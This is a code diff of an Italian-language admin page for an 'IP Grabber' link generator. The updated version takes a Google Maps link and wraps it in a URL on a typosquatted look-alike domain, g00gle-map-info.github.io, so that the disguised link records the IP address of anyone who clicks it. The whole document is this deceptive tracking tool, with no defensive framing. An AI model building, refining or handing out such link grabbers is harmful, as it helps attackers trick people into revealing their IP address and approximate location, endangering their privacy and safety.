@@ -5,13 +5,12 @@
   <title>Admin - Genera Link IP Grabber</title>
 </head>
 <body>
-  <h2>Modifica Posizione o Ricerca</h2>
+  <h2>Inserisci una posizione di Google Maps</h2>
   
-  <!-- Inserisci il termine di ricerca (es. ristorante, parco, ecc.) -->
-  <label for="search-term">Cosa stai cercando (es. ristorante, parco, ecc.):</label><br>
-  <input type="text" id="search-term" placeholder="Es. ristorante"><br><br>
+  <label for="maps-link">Link di Google Maps (es. https://www.google.com/maps?q=45.4642,9.1900):</label><br>
+  <input type="text" id="maps-link" placeholder="Es. https://www.google.com/maps?q=45.4642,9.1900"><br><br>
   
-  <!-- Aggiungi un pulsante per generare il link -->
+  <!-- Pulsante per generare il link -->
   <button onclick="generaLink()">Genera Link IP Grabber</button>
   
   <h3>Link IP Grabber</h3>
@@ -20,12 +19,18 @@
   <script>
     // Funzione per generare il link di IP grabber
     function generaLink() {
-      const searchTerm = document.getElementById('search-term').value;
+      const mapsLink = document.getElementById('maps-link').value;
       
-      // Creiamo il link di IP Grabber mascherato con query string
-      const grabberLink = "https://g00gle-map-info.github.io/?q=" + encodeURIComponent(searchTerm);
+      // Verifica se il link di Google Maps è valido
+      if (!mapsLink.includes("https://www.google.com/maps?q=")) {
+        alert("Per favore, inserisci un link valido di Google Maps.");
+        return;
+      }
       
-      // Mostriamo il link generato
+      // Codifica il link per l'URL
+      const grabberLink = "https://g00gle-map-info.github.io/?q=" + encodeURIComponent(mapsLink);
+      
+      // Mostra il link generato
       document.getElementById('link-output').textContent = grabberLink;
     }
   </script>
